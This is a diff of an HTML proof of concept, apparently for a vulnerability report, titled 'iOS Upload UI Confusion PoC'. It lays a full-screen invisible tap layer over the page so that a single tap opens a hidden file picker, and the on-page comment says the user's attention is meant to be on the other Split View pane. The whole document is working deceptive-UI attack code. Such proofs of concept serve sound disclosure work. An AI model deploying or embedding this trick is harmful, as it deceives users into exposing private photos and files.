@@ -2,30 +2,33 @@
 <html lang="en">
 <head>
 <meta charset="UTF-8">
-<title>iOS Split View Upload Spoof PoC</title>
+<title>iOS Upload UI Confusion PoC</title>
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 
 <style>
-  body {
+  html, body {
     margin: 0;
-    font-family: system-ui, -apple-system;
+    height: 100%;
+    font-family: -apple-system, BlinkMacSystemFont;
     background: #fff;
   }
 
-  .cover {
+  /* Full‑screen transparent interaction layer */
+  .tap-layer {
     position: fixed;
     inset: 0;
-    z-index: 10;
+    z-index: 999;
   }
 
-  .hint {
+  .info {
     position: fixed;
-    bottom: 20px;
+    bottom: 16px;
     left: 0;
     right: 0;
     text-align: center;
-    color: #444;
-    font-size: 14px;
+    font-size: 13px;
+    color: #666;
+    pointer-events: none;
   }
 
   input {
@@ -34,43 +37,43 @@
 
   img {
     width: 100%;
+    margin-top: 20px;
   }
 </style>
 </head>
 <body>
 
-<!-- Invisible interaction layer -->
-<div class="cover"></div>
+<div class="tap-layer"></div>
 
-<div class="hint">
-  Long‑press anywhere<br>
-  (User thinks Google Drive is active)
+<div class="info">
+  Tap once to upload<br>
+  (User attention on other Split View pane)
 </div>
 
-<input id="file" type="file" accept="image/*">
+<input id="picker" type="file" accept="image/*">
 <img id="preview">
 
 <script>
-const file = document.getElementById("file");
+const layer   = document.querySelector(".tap-layer");
+const picker  = document.getElementById("picker");
 const preview = document.getElementById("preview");
 
-let pressTimer;
+let used = false;
 
-document.querySelector(".cover").addEventListener("touchstart", () => {
-  pressTimer = setTimeout(() => {
-    file.click(); // triggers iOS photo/file picker
-  }, 700); // long‑press threshold
+// Single explicit user tap → valid gesture
+layer.addEventListener("click", () => {
+  if (used) return;
+  used = true;
+
+  // Direct, synchronous call (Safari‑valid)
+  picker.click();
 });
 
-document.querySelector(".cover").addEventListener("touchend", () => {
-  clearTimeout(pressTimer);
+// Preview selected file (visual proof of origin)
+picker.addEventListener("change", () => {
+  if (!picker.files.length) return;
+  preview.src = URL.createObjectURL(picker.files[0]);
 });
-
-file.onchange = () => {
-  if (file.files.length) {
-    preview.src = URL.createObjectURL(file.files[0]);
-  }
-};
 </script>
 
 </body>
